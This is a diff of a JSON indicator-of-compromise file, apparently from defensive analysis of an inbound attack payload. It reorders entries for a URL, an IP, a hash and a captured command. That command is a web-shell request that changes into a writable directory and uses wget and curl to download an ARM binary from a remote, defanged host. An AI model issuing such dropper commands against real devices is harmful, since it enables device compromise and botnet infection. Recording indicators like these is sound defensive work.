@@ -1,5 +1,11 @@
 [
   {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/nz/nz.arm7;"
+  },
+  {
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
@@ -12,21 +18,15 @@
     "value": "94.154.43.XXX"
   },
   {
-    "context": "Embedded URL in inbound payload",
+    "context": "Suspicious command in inbound payload",
     "source": "strings",
-    "type": "url",
-    "value": "hxxp://94.154.43.XXX/nz/nz.arm7;"
+    "type": "command",
+    "value": "GET /shell?cd/tmp||cd/var/run||cd/mnt||cd/root||cd/; wget hxxp://94.154.43.XXX/nz/nz.arm7; curl -O hxxp://94.154.43.XXX/"
   },
   {
     "context": "Inbound payload hash (unknown)",
     "source": "static_analysis",
     "type": "hash",
     "value": "cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "GET /shell?cd/tmp||cd/var/run||cd/mnt||cd/root||cd/; wget hxxp://94.154.43.XXX/nz/nz.arm7; curl -O hxxp://94.154.43.XXX/"
   }
 ]
